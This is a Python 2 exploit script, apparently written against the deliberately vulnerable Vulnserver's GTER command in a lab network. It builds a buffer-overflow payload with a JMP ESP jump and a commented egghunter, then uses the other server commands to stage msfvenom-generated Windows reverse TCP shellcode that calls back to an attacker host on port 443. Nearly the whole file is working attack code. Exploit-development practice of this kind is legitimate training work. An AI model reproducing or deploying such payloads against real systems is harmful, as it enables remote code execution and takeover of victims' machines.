#!/usr/bin/env python2
import os, sys, time
from socket import socket, AF_INET, SOCK_STREAM

host = (("192.168.56.8",9999))

sploit="GTER /.:/"
sploit += "A" * (147 - 32)
sploit+=(
    # <_start>
    "\x66\x81\xca\xff\x0f"        # OR DX, 0xFFFF
    # <loop_inc_one>
    "\x42"                        # INC EDX
    # <loop_check>
    "\x52"                        # PUSH EDX
    "\x6a\x02"                    # PUSH 0x2
    "\x58"                        # POP EAX
    "\xcd\x2e"                    # INT 0x2E                 # (syscall)
    "\x3c\x05"                    # CMP AL, 0x05          # (5 = ACCESS_VIOLTION), page != R
    "\x5a"                        # POP EDX
    # <loop_check_valid
    "\x74\xef"                    # JE -17                 # <_start> if bad page
    # <is_egg> #?
    "\xb8\x54\x30\x30\x57"        # MOV EAX, 0x57303054     # W00T LE
    "\x89\xd7"                    # MOV EDI, EDX
    "\xaf"                        # SCAS EAX, DWORD PTR ES:[EDI]
    "\x75\xea"                    # JNE -22                # <loop_inc_one> if not egg
    "\xaf"                        # SCAS EAX, DWORD PTR ES:[EDI]
    "\x75\xe7"                    # JNE -25                # <loop_inc_one> if not eggegg 
    # <matched>
    "\xff\xe7"                    # JMP EDI                # EGGEGG FOUND!
) # 32 bytes

sploit+="\xc7\x11\x50\x62" # 625011C7   FFE4             JMP ESP
NOTES="""\
01E1F9E0   54               PUSH ESP
01E1F9E1   58               POP EAX                                  ; 01E1F9E0
01E1F9E2   2C 94            SUB AL,24
01E1F9E4   50               PUSH EAX
01E1F9E5   5C               POP ESP
01E1F9E6   FFE4             JMP ESP
"""
sploit+="\x54\x58\x2c\x94\x50\x5c\xff\xe4" # push esp;pop eax;sub al,0x94;push eax;pop esp;jmp esp
sploit += "C" * (5000 - 147 - 4 - 8)

shell = "T00WT00W"
#  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.181 LPORT=443 EXITFUNC=process -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 1 -f c
shell+=(
"\xbb\xc1\x09\xf9\x72\xdb\xc9\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x4f\x31\x58\x14\x03\x58\x14\x83\xe8\xfc\x23\xfc\x05\x9a\x2a"
"\xff\xf5\x5b\x4c\x89\x13\x6a\x5e\xed\x50\xdf\x6e\x65\x34\xec"
"\x05\x2b\xad\x67\x6b\xe4\xc2\xc0\xc1\xd2\xed\xd1\xe4\xda\xa2"
"\x12\x67\xa7\xb8\x46\x47\x96\x72\x9b\x86\xdf\x6f\x54\xda\x88"
"\xe4\xc7\xca\xbd\xb9\xdb\xeb\x11\xb6\x64\x93\x14\x09\x10\x29"
"\x16\x5a\x89\x26\x50\x42\xa1\x60\x41\x73\x66\x73\xbd\x3a\x03"
"\x47\x35\xbd\xc5\x96\xb6\x8f\x29\x74\x89\x3f\xa4\x85\xcd\xf8"
"\x57\xf0\x25\xfb\xea\x02\xfe\x81\x30\x87\xe3\x22\xb2\x3f\xc0"
"\xd3\x17\xd9\x83\xd8\xdc\xae\xcc\xfc\xe3\x63\x67\xf8\x68\x82"
"\xa8\x88\x2b\xa0\x6c\xd0\xe8\xc9\x35\xbc\x5f\xf6\x26\x18\x3f"
"\x52\x2c\x8b\x54\xe4\x6f\xc4\x99\xda\x8f\x14\xb6\x6d\xe3\x26"
"\x19\xc5\x6b\x0b\xd2\xc3\x6c\x6c\xc9\xb3\xe3\x93\xf2\xc3\x2a"
"\x50\xa6\x93\x44\x71\xc7\x78\x95\x7e\x12\x2e\xc5\xd0\xcd\x8e"
"\xb5\x90\xbd\x66\xdc\x1e\xe1\x96\xdf\xf4\x94\x91\x48\x37\x0e"
"\x25\x3c\xdf\x4d\x55\x3f\x9b\xdb\xb3\x55\xcb\x8d\x6c\xc2\x72"
"\x94\xe6\x73\x7a\x02\x6e\x17\xe9\xc9\x6e\x5e\x12\x46\x39\x37"
"\xe4\x9f\xaf\xa5\x5f\x36\xcd\x37\x39\x71\x55\xec\xfa\x7c\x54"
"\x61\x46\x5b\x46\xbf\x47\xe7\x32\x6f\x1e\xb1\xec\xc9\xc8\x73"
"\x46\x80\xa7\xdd\x0e\x55\x84\xdd\x48\x5a\xc1\xab\xb4\xeb\xbc"
"\xed\xcb\xc4\x28\xfa\xb4\x38\xc9\x05\x6f\xf9\xf9\x4f\x2d\xa8"
"\x91\x09\xa4\xe8\xff\xa9\x13\x2e\x06\x2a\x91\xcf\xfd\x32\xd0"
"\xca\xba\xf4\x09\xa7\xd3\x90\x2d\x14\xd3\xb0"
) # 341

def SND(expl):
	cx = socket(AF_INET,SOCK_STREAM)
	cx.connect(host)
	cx.send(expl)
	cx.close()


CMDs = ['HELP','STATS','RTIME','LTIME','SRUN','TRUN','GMON','GDOG','KSTET','HTER','LTER','KSTAN']
# for item in ['GDOG']:
for item in CMDs:
	SND(sploit)
	SND(item + " " + shell)
	print("Testing " + item)
	devnull = raw_input("Enter to try next")





